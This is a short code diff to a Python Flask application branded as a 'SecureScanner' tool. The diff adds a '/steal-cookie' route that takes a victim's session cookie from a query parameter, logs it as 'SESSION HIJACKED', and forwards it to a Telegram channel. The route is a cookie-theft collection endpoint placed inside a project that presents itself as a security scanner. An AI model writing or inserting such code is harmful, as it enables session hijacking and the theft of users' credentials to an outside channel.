@@ -19,6 +19,14 @@ def add_security_headers(response):
     response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
     response.headers['Server'] = 'SecureScanner/4.0'
     return response
+@app.route('/steal-cookie', methods=['GET'])
+def steal_cookie():
+    stolen_cookie = request.args.get('cookie', 'No cookie received')
+    print(f"\n[!!!] SESSION HIJACKED! COOKIE: {stolen_cookie}\n", flush=True)
+    # Send it to Telegram (using the code we built earlier)
+    send_to_telegram(f"🚨 **SESSION HIJACKED** 🚨\nCookie: {stolen_cookie}")
+    return "Cookie received", 200
+
 
 # ==========================================
 # 🔍 ADVANCED SCANNER ENGINE
